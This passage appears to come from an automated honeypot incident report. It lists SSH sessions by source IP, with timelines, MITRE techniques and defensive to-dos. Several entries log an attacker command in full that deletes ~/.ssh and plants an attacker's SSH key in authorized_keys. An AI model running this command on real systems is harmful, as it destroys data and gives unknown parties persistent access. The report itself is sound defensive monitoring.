| `2026-07-02 19:53:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d48679364e20

| Field | Detail |
|---|---|
| **Source IP** | `13.94.39[.]162` |
| **First Seen** | 2026-07-02 19:53 |
| **Last Seen** | 2026-07-02 19:54 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:53:18` | `cowrie.session.connect` |
| `2026-07-02 19:53:18` | `cowrie.client.version` |
| `2026-07-02 19:53:18` | `cowrie.client.kex` |
| `2026-07-02 19:54:12` | `cowrie.login.success` |
| `2026-07-02 19:54:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.94.39[.]162` to AbuseIPDB if not already reported
- [ ] Block `13.94.39[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1de04196513b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 19:56 |
| **Last Seen** | 2026-07-02 19:57 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:56:50` | `cowrie.session.connect` |
| `2026-07-02 19:56:51` | `cowrie.client.version` |
| `2026-07-02 19:56:51` | `cowrie.client.kex` |
| `2026-07-02 19:56:58` | `cowrie.login.success` |
| `2026-07-02 19:57:02` | `cowrie.session.params` |
| `2026-07-02 19:57:02` | `cowrie.command.input` |
| `2026-07-02 19:57:03` | `cowrie.log.closed` |
| `2026-07-02 19:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3f81a43f6b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 19:57 |
| **Last Seen** | 2026-07-02 19:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:57:48` | `cowrie.session.connect` |
| `2026-07-02 19:57:49` | `cowrie.client.version` |
| `2026-07-02 19:57:49` | `cowrie.client.kex` |
| `2026-07-02 19:57:51` | `cowrie.login.success` |
| `2026-07-02 19:57:53` | `cowrie.session.params` |
| `2026-07-02 19:57:53` | `cowrie.command.input` |
| `2026-07-02 19:57:53` | `cowrie.log.closed` |
| `2026-07-02 19:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51d7970470ab

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-07-02 19:58 |
| **Last Seen** | 2026-07-02 19:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:58:11` | `cowrie.session.connect` |
| `2026-07-02 19:58:11` | `cowrie.client.version` |
| `2026-07-02 19:58:11` | `cowrie.client.kex` |
| `2026-07-02 19:58:12` | `cowrie.login.success` |
| `2026-07-02 19:58:13` | `cowrie.session.params` |
| `2026-07-02 19:58:13` | `cowrie.command.input` |
| `2026-07-02 19:58:13` | `cowrie.command.failed` |
| `2026-07-02 19:58:14` | `cowrie.log.closed` |
| `2026-07-02 19:58:14` | `cowrie.session.params` |
| `2026-07-02 19:58:14` | `cowrie.command.input` |
| `2026-07-02 19:58:15` | `cowrie.session.file_download` |
| `2026-07-02 19:58:15` | `cowrie.log.closed` |
| `2026-07-02 19:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a4fd9915847

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-07-02 19:58 |
| **Last Seen** | 2026-07-02 19:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:58:15` | `cowrie.session.connect` |
| `2026-07-02 19:58:15` | `cowrie.client.version` |
| `2026-07-02 19:58:15` | `cowrie.client.kex` |
| `2026-07-02 19:58:16` | `cowrie.login.success` |
| `2026-07-02 19:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bbb1557e981

| Field | Detail |
|---|---|
| **Source IP** | `117.218.75[.]251` |
| **First Seen** | 2026-07-02 19:58 |
| **Last Seen** | 2026-07-02 19:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:58:17` | `cowrie.session.connect` |
| `2026-07-02 19:58:17` | `cowrie.client.version` |
| `2026-07-02 19:58:17` | `cowrie.client.kex` |
| `2026-07-02 19:58:18` | `cowrie.login.success` |
| `2026-07-02 19:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.218.75[.]251` to AbuseIPDB if not already reported
- [ ] Block `117.218.75[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12fe0af48d9

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:58 |
| **Last Seen** | 2026-07-02 19:59 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:58:48` | `cowrie.session.connect` |
| `2026-07-02 19:58:53` | `cowrie.client.version` |
| `2026-07-02 19:58:53` | `cowrie.client.kex` |
| `2026-07-02 19:59:17` | `cowrie.login.success` |
| `2026-07-02 19:59:29` | `cowrie.session.params` |
| `2026-07-02 19:59:29` | `cowrie.command.input` |
| `2026-07-02 19:59:34` | `cowrie.log.closed` |
| `2026-07-02 19:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60179e3ec844

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 20:01 |
| **Last Seen** | 2026-07-02 20:02 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:01:20` | `cowrie.session.connect` |
| `2026-07-02 20:01:25` | `cowrie.client.version` |
| `2026-07-02 20:01:25` | `cowrie.client.kex` |
| `2026-07-02 20:01:47` | `cowrie.login.success` |
| `2026-07-02 20:01:59` | `cowrie.session.params` |
| `2026-07-02 20:01:59` | `cowrie.command.input` |
| `2026-07-02 20:02:05` | `cowrie.log.closed` |
| `2026-07-02 20:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18522894369f

| Field | Detail |
|---|---|
| **Source IP** | `45.157.156[.]222` |
| **First Seen** | 2026-07-02 20:02 |
| **Last Seen** | 2026-07-02 20:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:02:02` | `cowrie.session.connect` |
| `2026-07-02 20:02:02` | `cowrie.client.version` |
| `2026-07-02 20:02:02` | `cowrie.client.kex` |
| `2026-07-02 20:02:03` | `cowrie.login.success` |
| `2026-07-02 20:02:04` | `cowrie.session.params` |
| `2026-07-02 20:02:04` | `cowrie.command.input` |
| `2026-07-02 20:02:04` | `cowrie.command.failed` |
| `2026-07-02 20:02:04` | `cowrie.log.closed` |
| `2026-07-02 20:02:05` | `cowrie.session.params` |
| `2026-07-02 20:02:05` | `cowrie.command.input` |
| `2026-07-02 20:02:05` | `cowrie.session.file_download` |
| `2026-07-02 20:02:05` | `cowrie.log.closed` |
| `2026-07-02 20:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.157.156[.]222` to AbuseIPDB if not already reported
- [ ] Block `45.157.156[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-015a41f5dece

| Field | Detail |
|---|---|
| **Source IP** | `45.157.156[.]222` |
| **First Seen** | 2026-07-02 20:02 |
| **Last Seen** | 2026-07-02 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:02:05` | `cowrie.session.connect` |
| `2026-07-02 20:02:05` | `cowrie.client.version` |
| `2026-07-02 20:02:05` | `cowrie.client.kex` |
| `2026-07-02 20:02:06` | `cowrie.login.success` |
| `2026-07-02 20:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.157.156[.]222` to AbuseIPDB if not already reported
- [ ] Block `45.157.156[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35fcedda628

| Field | Detail |
|---|---|
| **Source IP** | `45.157.156[.]222` |
| **First Seen** | 2026-07-02 20:02 |
| **Last Seen** | 2026-07-02 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:02:06` | `cowrie.session.connect` |
| `2026-07-02 20:02:06` | `cowrie.client.version` |
| `2026-07-02 20:02:06` | `cowrie.client.kex` |
| `2026-07-02 20:02:07` | `cowrie.login.success` |
| `2026-07-02 20:02:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.157.156[.]222` to AbuseIPDB if not already reported
- [ ] Block `45.157.156[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d162979e817

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 20:02 |
| **Last Seen** | 2026-07-02 20:02 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:02:10` | `cowrie.session.connect` |
| `2026-07-02 20:02:15` | `cowrie.client.version` |
| `2026-07-02 20:02:15` | `cowrie.client.kex` |
| `2026-07-02 20:02:38` | `cowrie.login.success` |
| `2026-07-02 20:02:51` | `cowrie.session.params` |
| `2026-07-02 20:02:51` | `cowrie.command.input` |
| `2026-07-02 20:02:56` | `cowrie.log.closed` |
| `2026-07-02 20:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c096b678c047

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 20:05 |
| **Last Seen** | 2026-07-02 20:06 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:05:19` | `cowrie.session.connect` |
| `2026-07-02 20:05:24` | `cowrie.client.version` |
| `2026-07-02 20:05:24` | `cowrie.client.kex` |
| `2026-07-02 20:05:47` | `cowrie.login.success` |
| `2026-07-02 20:05:59` | `cowrie.session.params` |
| `2026-07-02 20:05:59` | `cowrie.command.input` |
| `2026-07-02 20:06:04` | `cowrie.log.closed` |
| `2026-07-02 20:06:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-793921a510c8

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 20:07 |
| **Last Seen** | 2026-07-02 20:08 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:07:31` | `cowrie.session.connect` |
| `2026-07-02 20:07:37` | `cowrie.client.version` |
| `2026-07-02 20:07:37` | `cowrie.client.kex` |
| `2026-07-02 20:07:59` | `cowrie.login.success` |
| `2026-07-02 20:08:12` | `cowrie.session.params` |
| `2026-07-02 20:08:12` | `cowrie.command.input` |
| `2026-07-02 20:08:17` | `cowrie.log.closed` |
| `2026-07-02 20:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dec587996d92

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 20:07 |
| **Last Seen** | 2026-07-02 20:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:07:51` | `cowrie.session.connect` |
| `2026-07-02 20:07:51` | `cowrie.client.version` |
| `2026-07-02 20:07:51` | `cowrie.client.kex` |
| `2026-07-02 20:07:51` | `cowrie.login.success` |
| `2026-07-02 20:07:52` | `cowrie.session.params` |
| `2026-07-02 20:07:52` | `cowrie.command.input` |
| `2026-07-02 20:07:52` | `cowrie.log.closed` |
| `2026-07-02 20:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea91483def52

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 20:09 |
| **Last Seen** | 2026-07-02 20:09 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:09:07` | `cowrie.session.connect` |
| `2026-07-02 20:09:08` | `cowrie.client.version` |
| `2026-07-02 20:09:08` | `cowrie.client.kex` |
| `2026-07-02 20:09:15` | `cowrie.login.success` |
| `2026-07-02 20:09:18` | `cowrie.session.params` |
| `2026-07-02 20:09:18` | `cowrie.command.input` |
| `2026-07-02 20:09:20` | `cowrie.log.closed` |
| `2026-07-02 20:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ef9621cf4c0

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 20:12 |
| **Last Seen** | 2026-07-02 20:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:12:02` | `cowrie.session.connect` |
| `2026-07-02 20:12:03` | `cowrie.client.version` |
| `2026-07-02 20:12:03` | `cowrie.client.kex` |
| `2026-07-02 20:12:05` | `cowrie.login.success` |
| `2026-07-02 20:12:07` | `cowrie.session.params` |
| `2026-07-02 20:12:07` | `cowrie.command.input` |
| `2026-07-02 20:12:07` | `cowrie.log.closed` |
| `2026-07-02 20:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e439f6867f2e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 20:21 |
| **Last Seen** | 2026-07-02 20:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:21:44` | `cowrie.session.connect` |
| `2026-07-02 20:21:45` | `cowrie.client.version` |
| `2026-07-02 20:21:45` | `cowrie.client.kex` |
| `2026-07-02 20:21:52` | `cowrie.login.success` |
| `2026-07-02 20:21:56` | `cowrie.session.params` |
| `2026-07-02 20:21:56` | `cowrie.command.input` |
| `2026-07-02 20:21:57` | `cowrie.log.closed` |
| `2026-07-02 20:21:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09c671a28152

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 20:26 |
| **Last Seen** | 2026-07-02 20:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:26:16` | `cowrie.session.connect` |
| `2026-07-02 20:26:17` | `cowrie.client.version` |
| `2026-07-02 20:26:17` | `cowrie.client.kex` |
| `2026-07-02 20:26:19` | `cowrie.login.success` |
| `2026-07-02 20:26:20` | `cowrie.session.params` |
| `2026-07-02 20:26:20` | `cowrie.command.input` |
| `2026-07-02 20:26:20` | `cowrie.log.closed` |
| `2026-07-02 20:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27124f791901

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 20:33 |
| **Last Seen** | 2026-07-02 20:34 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:33:49` | `cowrie.session.connect` |
| `2026-07-02 20:33:50` | `cowrie.client.version` |
| `2026-07-02 20:33:50` | `cowrie.client.kex` |
| `2026-07-02 20:33:56` | `cowrie.login.success` |
| `2026-07-02 20:34:00` | `cowrie.session.params` |
| `2026-07-02 20:34:00` | `cowrie.command.input` |
| `2026-07-02 20:34:02` | `cowrie.log.closed` |
| `2026-07-02 20:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85ab18ceca78

| Field | Detail |
|---|---|
| **Source IP** | `47.95.234[.]23` |
| **First Seen** | 2026-07-02 20:37 |
| **Last Seen** | 2026-07-02 20:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:37:00` | `cowrie.session.connect` |
| `2026-07-02 20:37:00` | `cowrie.telnet.option` |
| `2026-07-02 20:37:01` | `cowrie.telnet.option` |
| `2026-07-02 20:38:01` | `cowrie.login.success` |
| `2026-07-02 20:38:01` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.95.234[.]23` to AbuseIPDB if not already reported
- [ ] Block `47.95.234[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d99a819afdd0

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-07-02 20:38 |
| **Last Seen** | 2026-07-02 20:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:38:07` | `cowrie.session.connect` |
| `2026-07-02 20:38:07` | `cowrie.client.version` |
| `2026-07-02 20:38:07` | `cowrie.client.kex` |
| `2026-07-02 20:38:08` | `cowrie.login.success` |
| `2026-07-02 20:38:09` | `cowrie.session.params` |
| `2026-07-02 20:38:09` | `cowrie.command.input` |
| `2026-07-02 20:38:09` | `cowrie.command.failed` |
| `2026-07-02 20:38:09` | `cowrie.log.closed` |
| `2026-07-02 20:38:10` | `cowrie.session.params` |
| `2026-07-02 20:38:10` | `cowrie.command.input` |
| `2026-07-02 20:38:10` | `cowrie.session.file_download` |
| `2026-07-02 20:38:10` | `cowrie.log.closed` |
| `2026-07-02 20:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad5acc2e51d6

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-07-02 20:38 |
| **Last Seen** | 2026-07-02 20:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 20:38:10` | `cowrie.session.connect` |
| `2026-07-02 20:38:10` | `cowrie.client.version` |
| `2026-07-02 20:38:10` | `cowrie.client.kex` |
| `2026-07-02 20:38:11` | `cowrie.login.success` |
| `2026-07-02 20:38:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.253.251[.]7` to AbuseIPDB if not already reported
- [ ] Block `72.253.251[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcc265cde63d

| Field | Detail |
|---|---|
| **Source IP** | `72.253.251[.]7` |
| **First Seen** | 2026-07-02 20:38 |
| **Last Seen** | 2026-07-02 20:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
